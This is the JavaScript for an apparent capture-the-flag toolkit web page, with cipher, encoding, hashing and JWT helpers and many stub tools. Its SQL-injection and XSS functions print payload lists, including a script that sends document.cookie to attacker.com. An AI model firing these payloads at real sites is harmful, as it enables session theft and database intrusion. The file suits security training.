// CTF Arsenal Platform - Complete JavaScript Implementation

// Initialize the platform
document.addEventListener('DOMContentLoaded', function() {
    console.log('🛡️ CTF Arsenal Platform Ready!');
    initializeNavigation();
    initializeDashboard();
    console.log('CTF Arsenal Platform Initialized');
});

// Navigation System
function initializeNavigation() {
    const navButtons = document.querySelectorAll('.nav-btn');
    const sections = document.querySelectorAll('.tool-section');

    navButtons.forEach(button => {
        button.addEventListener('click', function() {
            const category = this.getAttribute('data-category');

            // Remove active class from all buttons and sections
            navButtons.forEach(btn => btn.classList.remove('active'));
            sections.forEach(section => section.classList.remove('active'));

            // Add active class to clicked button and corresponding section
            this.classList.add('active');
            const targetSection = document.getElementById(category);
            if (targetSection) {
                targetSection.classList.add('active');
            }
        });
    });
}

// Dashboard initialization
function initializeDashboard() {
    const dashboardCards = document.querySelectorAll('.dashboard-card');
    const navButtons = document.querySelectorAll('.nav-btn');

    dashboardCards.forEach((card, index) => {
        card.addEventListener('click', function() {
            // Map dashboard cards to navigation categories
            const categories = ['dashboard', 'crypto', 'web', 'forensics', 'pwn', 'reverse', 'misc'];
            if (index + 1 < categories.length) {
                const targetCategory = categories[index + 1];
                const targetButton = document.querySelector(`[data-category="${targetCategory}"]`);
                if (targetButton) {
                    targetButton.click();
                }
            }
        });
    });
}

// Utility functions
function showSuccess(element) {
    element.classList.remove('error');
    element.classList.add('success');
    setTimeout(() => element.classList.remove('success'), 3000);
}

function showError(element, message) {
    element.value = `❌ Error: ${message}`;
    element.classList.remove('success');
    element.classList.add('error');
    setTimeout(() => element.classList.remove('error'), 3000);
}

// Cryptography Tools
function caesarEncrypt() {
    const input = document.getElementById('caesar-input').value;
    const shift = parseInt(document.getElementById('caesar-shift').value) || 13;
    const output = document.getElementById('caesar-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to encrypt');
        return;
    }

    let result = '';
    for (let i = 0; i < input.length; i++) {
        let char = input[i];
        if (char.match(/[a-z]/i)) {
            let code = input.charCodeAt(i);
            if (code >= 65 && code <= 90) {
                char = String.fromCharCode(((code - 65 + shift) % 26) + 65);
            } else if (code >= 97 && code <= 122) {
                char = String.fromCharCode(((code - 97 + shift) % 26) + 97);
            }
        }
        result += char;
    }

    output.value = `🔐 Caesar Cipher (Shift ${shift}):\n${result}`;
    showSuccess(output);
}

function caesarDecrypt() {
    const input = document.getElementById('caesar-input').value;
    const shift = parseInt(document.getElementById('caesar-shift').value) || 13;
    const output = document.getElementById('caesar-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to decrypt');
        return;
    }

    let result = '';
    for (let i = 0; i < input.length; i++) {
        let char = input[i];
        if (char.match(/[a-z]/i)) {
            let code = input.charCodeAt(i);
            if (code >= 65 && code <= 90) {
                char = String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
            } else if (code >= 97 && code <= 122) {
                char = String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
            }
        }
        result += char;
    }

    output.value = `🔓 Caesar Cipher Decrypted (Shift ${shift}):\n${result}`;
    showSuccess(output);
}

function caesarBruteForce() {
    const input = document.getElementById('caesar-input').value;
    const output = document.getElementById('caesar-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to brute force');
        return;
    }

    let results = '🔍 Caesar Cipher Brute Force Results:\n\n';
    for (let shift = 1; shift <= 25; shift++) {
        let result = '';
        for (let i = 0; i < input.length; i++) {
            let char = input[i];
            if (char.match(/[a-z]/i)) {
                let code = input.charCodeAt(i);
                if (code >= 65 && code <= 90) {
                    char = String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
                } else if (code >= 97 && code <= 122) {
                    char = String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
                }
            }
            result += char;
        }
        results += `Shift ${shift.toString().padStart(2, ' ')}: ${result}\n`;
    }

    output.value = results;
    showSuccess(output);
}

// Base64 Functions
function base64Encode() {
    const input = document.getElementById('base64-input').value;
    const output = document.getElementById('base64-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to encode');
        return;
    }

    try {
        const encoded = btoa(unescape(encodeURIComponent(input)));
        output.value = `📝 Base64 Encoded:\n${encoded}`;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Failed to encode text');
    }
}

function base64Decode() {
    const input = document.getElementById('base64-input').value;
    const output = document.getElementById('base64-output');

    if (!input.trim()) {
        showError(output, 'Please enter base64 to decode');
        return;
    }

    try {
        const decoded = decodeURIComponent(escape(atob(input.trim())));
        output.value = `📝 Base64 Decoded:\n${decoded}`;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Invalid base64 input');
    }
}

function base64Auto() {
    const input = document.getElementById('base64-input').value;
    const output = document.getElementById('base64-output');

    if (!input.trim()) {
        showError(output, 'Please enter text or base64');
        return;
    }

    // Try to detect if it's base64
    if (input.match(/^[A-Za-z0-9+/]*={0,2}$/)) {
        base64Decode();
    } else {
        base64Encode();
    }
}

// Hash Functions
async function generateHash() {
    const input = document.getElementById('hash-input').value;
    const hashType = document.getElementById('hash-type').value;
    const output = document.getElementById('hash-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to hash');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(input);

        let hashBuffer;
        switch (hashType) {
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
            default:
                // MD5 not supported by WebCrypto, show placeholder
                output.value = `🔐 ${hashType.toUpperCase()} Hash:\nMD5 not supported in browser. Use server-side tools.`;
                showSuccess(output);
                return;
        }

        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

        output.value = `🔐 ${hashType.toUpperCase()} Hash:\n${hashHex}`;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Failed to generate hash');
    }
}

async function generateAllHashes() {
    const input = document.getElementById('hash-input').value;
    const output = document.getElementById('hash-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to hash');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(input);

        const sha1 = await crypto.subtle.digest('SHA-1', data);
        const sha256 = await crypto.subtle.digest('SHA-256', data);
        const sha512 = await crypto.subtle.digest('SHA-512', data);

        const sha1Hex = Array.from(new Uint8Array(sha1)).map(b => b.toString(16).padStart(2, '0')).join('');
        const sha256Hex = Array.from(new Uint8Array(sha256)).map(b => b.toString(16).padStart(2, '0')).join('');
        const sha512Hex = Array.from(new Uint8Array(sha512)).map(b => b.toString(16).padStart(2, '0')).join('');

        let result = '🔐 All Hash Types:\n\n';
        result += `MD5:    (Not supported in browser)\n`;
        result += `SHA1:   ${sha1Hex}\n`;
        result += `SHA256: ${sha256Hex}\n`;
        result += `SHA512: ${sha512Hex}`;

        output.value = result;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Failed to generate hashes');
    }
}

// Vigenère Cipher
function vigenereEncrypt() {
    const input = document.getElementById('vigenere-input').value;
    const key = document.getElementById('vigenere-key').value.toUpperCase();
    const output = document.getElementById('vigenere-output');

    if (!input.trim() || !key.trim()) {
        showError(output, 'Please enter both text and key');
        return;
    }

    let result = '';
    let keyIndex = 0;

    for (let i = 0; i < input.length; i++) {
        let char = input[i];
        if (char.match(/[a-zA-Z]/)) {
            const isUpperCase = char === char.toUpperCase();
            char = char.toUpperCase();
            const charCode = char.charCodeAt(0) - 65;
            const keyCode = key[keyIndex % key.length].charCodeAt(0) - 65;
            const encryptedCode = (charCode + keyCode) % 26;
            let encryptedChar = String.fromCharCode(encryptedCode + 65);
            if (!isUpperCase) encryptedChar = encryptedChar.toLowerCase();
            result += encryptedChar;
            keyIndex++;
        } else {
            result += char;
        }
    }

    output.value = `🔐 Vigenère Encrypted:\n${result}`;
    showSuccess(output);
}

function vigenereDecrypt() {
    const input = document.getElementById('vigenere-input').value;
    const key = document.getElementById('vigenere-key').value.toUpperCase();
    const output = document.getElementById('vigenere-output');

    if (!input.trim() || !key.trim()) {
        showError(output, 'Please enter both text and key');
        return;
    }

    let result = '';
    let keyIndex = 0;

    for (let i = 0; i < input.length; i++) {
        let char = input[i];
        if (char.match(/[a-zA-Z]/)) {
            const isUpperCase = char === char.toUpperCase();
            char = char.toUpperCase();
            const charCode = char.charCodeAt(0) - 65;
            const keyCode = key[keyIndex % key.length].charCodeAt(0) - 65;
            const decryptedCode = (charCode - keyCode + 26) % 26;
            let decryptedChar = String.fromCharCode(decryptedCode + 65);
            if (!isUpperCase) decryptedChar = decryptedChar.toLowerCase();
            result += decryptedChar;
            keyIndex++;
        } else {
            result += char;
        }
    }

    output.value = `🔓 Vigenère Decrypted:\n${result}`;
    showSuccess(output);
}

// Web Security Tools
function testSQLInjection() {
    const url = document.getElementById('sql-url').value;
    const params = document.getElementById('sql-params').value;
    const output = document.getElementById('sql-output');

    if (!url.trim()) {
        showError(output, 'Please enter a target URL');
        return;
    }

    let result = '🔍 SQL Injection Test Results:\n\n';
    result += `Target: ${url}\n`;
    result += `Parameters: ${params || 'None specified'}\n\n`;
    result += '⚠️ Manual testing recommended with:\n';
    result += '• Single quote (\') for syntax errors\n';
    result += '• OR 1=1 for boolean bypass\n';
    result += '• UNION SELECT for data extraction\n';
    result += '• Time-based payloads for blind SQLi\n\n';
    result += '🛡️ Always test on authorized systems only!';

    output.value = result;
    showSuccess(output);
}

function generateSQLPayloads() {
    const output = document.getElementById('sql-output');

    let result = '🎯 SQL Injection Payload Collection:\n\n';
    result += 'Authentication Bypass:\n';
    result += '• admin\'--\n';
    result += '• admin\'/*\n';
    result += '\' OR \'1\'=\'1\n';
    result += '\' OR 1=1--\n\n';

    result += 'Union-based:\n';
    result += '\' UNION SELECT null,null,null--\n';
    result += '\' UNION SELECT 1,version(),database()--\n\n';

    result += 'Time-based Blind:\n';
    result += '\'; WAITFOR DELAY \'0:0:5\'--\n';
    result += '\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n';

    result += 'Boolean-based Blind:\n';
    result += '\' AND 1=1--\n';
    result += '\' AND 1=2--\n';

    output.value = result;
    showSuccess(output);
}

// XSS Tools
function generateXSSPayloads() {
    const xssType = document.getElementById('xss-type').value;
    const context = document.getElementById('xss-context').value;
    const output = document.getElementById('xss-output');

    let result = `🎯 ${xssType.toUpperCase()} XSS Payloads:\n\n`;

    result += 'Basic Payloads:\n';
    result += '<script>alert(\'XSS\')</script>\n';
    result += '<img src=x onerror=alert(\'XSS\')>\n';
    result += '<svg onload=alert(\'XSS\')>\n\n';

    result += 'Context-specific:\n';
    if (context.toLowerCase().includes('input')) {
        result += '"><script>alert(\'XSS\')</script>\n';
        result += '\' onmouseover="alert(\'XSS\')\n';
    }

    result += 'Advanced Payloads:\n';
    result += '<script>fetch(\'//attacker.com?\'+document.cookie)</script>\n';
    result += '<img src=x onerror=eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))>\n\n';

    result += '⚠️ Use only on authorized systems!';

    output.value = result;
    showSuccess(output);
}

function testXSS() {
    const output = document.getElementById('xss-output');

    let result = '🔍 XSS Testing Guide:\n\n';
    result += '1. Input Validation Testing:\n';
    result += '   • Try basic payloads in all input fields\n';
    result += '   • Test URL parameters and headers\n';
    result += '   • Check file upload functionality\n\n';

    result += '2. Context Analysis:\n';
    result += '   • HTML context: <tag>payload</tag>\n';
    result += '   • Attribute context: <tag attr="payload">\n';
    result += '   • JavaScript context: var x = "payload"\n\n';

    result += '3. Filter Bypass Techniques:\n';
    result += '   • Case variation: <ScRiPt>\n';
    result += '   • Encoding: %3Cscript%3E\n';
    result += '   • Alternative tags: <img>, <svg>, <iframe>\n\n';

    result += '🛡️ Always test responsibly!';

    output.value = result;
    showSuccess(output);
}

// URL Encoding Tools
function urlEncode() {
    const input = document.getElementById('url-input').value;
    const output = document.getElementById('url-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to encode');
        return;
    }

    const encoded = encodeURIComponent(input);
    output.value = `🔗 URL Encoded:\n${encoded}`;
    showSuccess(output);
}

function urlDecode() {
    const input = document.getElementById('url-input').value;
    const output = document.getElementById('url-output');

    if (!input.trim()) {
        showError(output, 'Please enter URL encoded text');
        return;
    }

    try {
        const decoded = decodeURIComponent(input);
        output.value = `🔗 URL Decoded:\n${decoded}`;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Invalid URL encoding');
    }
}

function doubleUrlEncode() {
    const input = document.getElementById('url-input').value;
    const output = document.getElementById('url-output');

    if (!input.trim()) {
        showError(output, 'Please enter text to double encode');
        return;
    }

    const encoded = encodeURIComponent(encodeURIComponent(input));
    output.value = `🔗 Double URL Encoded:\n${encoded}`;
    showSuccess(output);
}

// JWT Tools
function decodeJWT() {
    const input = document.getElementById('jwt-input').value;
    const output = document.getElementById('jwt-output');

    if (!input.trim()) {
        showError(output, 'Please enter a JWT token');
        return;
    }

    try {
        const parts = input.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format');
        }

        const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
        const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

        let result = '🎫 JWT Decoded:\n\n';
        result += 'Header:\n';
        result += JSON.stringify(header, null, 2) + '\n\n';
        result += 'Payload:\n';
        result += JSON.stringify(payload, null, 2) + '\n\n';
        result += 'Signature:\n';
        result += parts[2];

        output.value = result;
        showSuccess(output);
    } catch (error) {
        showError(output, 'Invalid JWT token');
    }
}

function validateJWT() {
    const output = document.getElementById('jwt-output');

    let result = '🔍 JWT Validation Guide:\n\n';
    result += '⚠️ Client-side validation is limited!\n\n';
    result += 'Common JWT Vulnerabilities:\n';
    result += '• None algorithm attack\n';
    result += '• Weak signing keys\n';
    result += '• Algorithm confusion\n';
    result += '• Token expiration issues\n\n';
    result += 'Professional Tools:\n';
    result += '• jwt.io for online decoding\n';
    result += '• Burp Suite JWT Editor\n';
    result += '• OWASP JWT Tool';

    output.value = result;
    showSuccess(output);
}

// Placeholder functions for remaining tools
function analyzeFile() {
    const output = document.getElementById('file-output');
    output.value = '📁 File analysis feature requires backend implementation.\nUse tools like: file, strings, hexdump, binwalk';
    showSuccess(output);
}

function extractStrings() {
    const output = document.getElementById('file-output');
    output.value = '🔍 String extraction requires backend.\nUse: strings filename | head -50';
    showSuccess(output);
}

function hexDump() {
    const output = document.getElementById('file-output');
    output.value = '🔢 Hex dump requires backend.\nUse: hexdump -C filename | head -20';
    showSuccess(output);
}

// Additional placeholder functions for all other tools
function detectSteganography() {
    const output = document.getElementById('stego-output');
    output.value = '🖼️ Steganography detection requires specialized tools.\nTry: steghide, stegsolve, binwalk, exiftool';
    showSuccess(output);
}

function extractLSB() {
    const output = document.getElementById('stego-output');
    output.value = '🔍 LSB extraction requires image processing.\nTools: stegsolve, zsteg, steghide';
    showSuccess(output);
}

function extractEXIF() {
    const output = document.getElementById('exif-output');
    output.value = '📷 EXIF extraction requires backend processing.\nUse: exiftool image.jpg';
    showSuccess(output);
}

function cleanEXIF() {
    const output = document.getElementById('exif-output');
    output.value = '🧹 EXIF cleaning guide:\n• exiftool -all= image.jpg\n• Use GIMP: Export > Advanced > Uncheck metadata';
    showSuccess(output);
}

function analyzePCAP() {
    const output = document.getElementById('pcap-output');
    output.value = '📡 PCAP analysis requires backend tools.\nUse: Wireshark, tshark, tcpdump';
    showSuccess(output);
}

function extractCredentials() {
    const output = document.getElementById('pcap-output');
    output.value = '🔑 Credential extraction from PCAP:\n• Look for HTTP POST data\n• Check FTP traffic\n• Analyze unencrypted protocols';
    showSuccess(output);
}

function generateShellcode() {
    const output = document.getElementById('shellcode-output');
    output.value = '💻 Shellcode generation requires specialized tools.\nUse: msfvenom, pwntools, shellcraft';
    showSuccess(output);
}

function encodeShellcode() {
    const output = document.getElementById('shellcode-output');
    output.value = '🔄 Shellcode encoding requires backend.\nTechniques: XOR, Alpha-numeric, Unicode';
    showSuccess(output);
}

function buildROPChain() {
    const output = document.getElementById('rop-output');
    output.value = '⛓️ ROP chain building requires analysis tools.\nUse: ROPgadget, ropper, pwntools';
    showSuccess(output);
}

function findGadgets() {
    const output = document.getElementById('rop-output');
    output.value = '🔍 Gadget finding requires binary analysis.\nTools: ROPgadget, ropper, radare2';
    showSuccess(output);
}

function generatePattern() {
    const length = parseInt(document.getElementById('pattern-length').value) || 100;
    const output = document.getElementById('pattern-output');

    let pattern = '';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    for (let i = 0; i < length; i++) {
        pattern += chars[i % chars.length];
    }

    output.value = `📏 Pattern (${length} bytes):\n${pattern}`;
    showSuccess(output);
}

function findOffset() {
    const output = document.getElementById('pattern-output');
    output.value = '🎯 To find offset:\n1. Use pattern above as input\n2. Note crash address\n3. Search for that sequence in pattern';
    showSuccess(output);
}

function testFormatString() {
    const output = document.getElementById('format-output');
    output.value = '🔍 Format string testing requires runtime analysis.\nTry: %x %s %p %n with different offsets';
    showSuccess(output);
}

function generateFormatPayload() {
    const output = document.getElementById('format-output');
    output.value = '💥 Format string payloads:\n• %x for hex dump\n• %s for string read\n• %n for write primitive\n⚠️ Be careful with %n!';
    showSuccess(output);
}

function assembleCode() {
    const output = document.getElementById('asm-output');
    output.value = '⚙️ Assembly requires backend tools.\nUse: nasm, gas, online assemblers';
    showSuccess(output);
}

function disassembleCode() {
    const output = document.getElementById('asm-output');
    output.value = '🔍 Disassembly requires specialized tools.\nUse: objdump, radare2, Ghidra, IDA';
    showSuccess(output);
}

function extractStringsFromFile() {
    const output = document.getElementById('strings-output');
    output.value = '📝 String extraction requires backend.\nCommand: strings -n 4 filename';
    showSuccess(output);
}

function filterStrings() {
    const output = document.getElementById('strings-output');
    output.value = '🔍 String filtering examples:\n• strings file | grep -i password\n• strings file | grep -E "^[a-zA-Z0-9._%+-]+@"';
    showSuccess(output);
}

function xorData() {
    const output = document.getElementById('xor-output');
    output.value = '⚡ XOR analysis requires hex processing.\nTry online XOR tools or Python scripts';
    showSuccess(output);
}

function bruteForceXOR() {
    const output = document.getElementById('xor-output');
    output.value = '🔄 XOR brute force:\nfor key in range(256):\n    result = xor_data(data, key)\n    if is_printable(result): print(result)';
    showSuccess(output);
}

function deobfuscateCode() {
    const output = document.getElementById('deobfuscated-output');
    output.value = '🔓 Code deobfuscation requires specialized tools.\nJavaScript: de4js.org\nPowerShell: PowerDecode';
    showSuccess(output);
}

function beautifyCode() {
    const output = document.getElementById('deobfuscated-output');
    output.value = '✨ Code beautification:\n• Prettier for JS/TS\n• Black for Python\n• Online beautifiers available';
    showSuccess(output);
}

function generateQR() {
    const input = document.getElementById('qr-input').value;
    const output = document.getElementById('qr-output');

    if (!input.trim()) {
        output.innerHTML = '❌ Please enter text to generate QR code';
        return;
    }

    output.innerHTML = `📱 QR Code generation requires QR library.<br>Text: "${input}"<br>Use online QR generators or qrcode library`;
}

function readQR() {
    const output = document.getElementById('qr-output');
    output.innerHTML = '📷 QR reading requires image processing backend.<br>Use: zbarimg, online QR readers';
}

function performOSINT() {
    const target = document.getElementById('osint-target').value;
    const type = document.getElementById('osint-type').value;
    const output = document.getElementById('osint-output');

    if (!target.trim()) {
        showError(output, 'Please enter a target');
        return;
    }

    let result = `🔍 OSINT Search for: ${target}\nType: ${type}\n\n`;
    result += 'Recommended Tools:\n';
    result += '• Domain: whois, dig, sublist3r\n';
    result += '• IP: nmap, shodan, censys\n';
    result += '• Username: sherlock, social-analyzer\n';
    result += '• General: maltego, spiderfoot';

    output.value = result;
    showSuccess(output);
}

function generateOSINTReport() {
    const output = document.getElementById('osint-output');
    output.value = '📊 OSINT Report Template:\n1. Target Information\n2. Domain Analysis\n3. IP Reconnaissance\n4. Social Media Presence\n5. Security Assessment\n6. Recommendations';
    showSuccess(output);
}

function generatePassword() {
    const length = parseInt(document.getElementById('pwd-length').value) || 16;
    const upper = document.getElementById('pwd-upper').checked;
    const lower = document.getElementById('pwd-lower').checked;
    const numbers = document.getElementById('pwd-numbers').checked;
    const symbols = document.getElementById('pwd-symbols').checked;
    const output = document.getElementById('pwd-output');

    let charset = '';
    if (upper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (lower) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (numbers) charset += '0123456789';
    if (symbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

    if (!charset) {
        showError(output, 'Please select at least one character type');
        return;
    }

    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }

    output.value = `🔐 Generated Password (${length} chars):\n${password}`;
    showSuccess(output);
}

function checkPasswordStrength() {
    const output = document.getElementById('pwd-output');
    output.value = '💪 Password Strength Criteria:\n• 12+ characters\n• Mixed case letters\n• Numbers and symbols\n• Avoid dictionary words\n• Unique for each account';
    showSuccess(output);
}

function scanPorts() {
    const target = document.getElementById('scan-target').value;
    const ports = document.getElementById('scan-ports').value;
    const output = document.getElementById('scan-output');

    if (!target.trim()) {
        showError(output, 'Please enter a target');
        return;
    }

    let result = `🔍 Port Scan Simulation for: ${target}\n`;
    result += `Ports: ${ports}\n\n`;
    result += '⚠️ Actual scanning requires backend tools:\n';
    result += '• nmap -sS target\n';
    result += '• masscan -p1-1000 target\n';
    result += '• unicornscan target\n\n';
    result += '🛡️ Only scan authorized systems!';

    output.value = result;
    showSuccess(output);
}

function quickScan() {
    const target = document.getElementById('scan-target').value;
    const output = document.getElementById('scan-output');

    if (!target.trim()) {
        showError(output, 'Please enter a target');
        return;
    }

    output.value = `⚡ Quick Scan Template for: ${target}\n\nCommon commands:\n• nmap -sV -sC ${target}\n• nmap -p- ${target}\n• nmap -sU --top-ports 1000 ${target}`;
    showSuccess(output);
}
function bitsToText(bits) {
    let text = '';
    for (let i = 0; i < bits.length; i += 8) {
        const byte = bits.substr(i, 8);
        if (byte.length === 8) {
            const charCode = parseInt(byte, 2);
            if (charCode >= 32 && charCode <= 126) {
                text += String.fromCharCode(charCode);
            }
        }
    }
    return text;
}

function getLinkTypeName(linkType) {
    const linkTypes = {
        0: 'NULL',
        1: 'Ethernet',
        6: 'Token Ring',
        9: 'PPP',
        105: 'IEEE 802.11',
        127: 'Loopback'
    };
    return linkTypes[linkType] || 'Unknown';
}
console.log('🛡️ CTF Arsenal Platform Ready!');
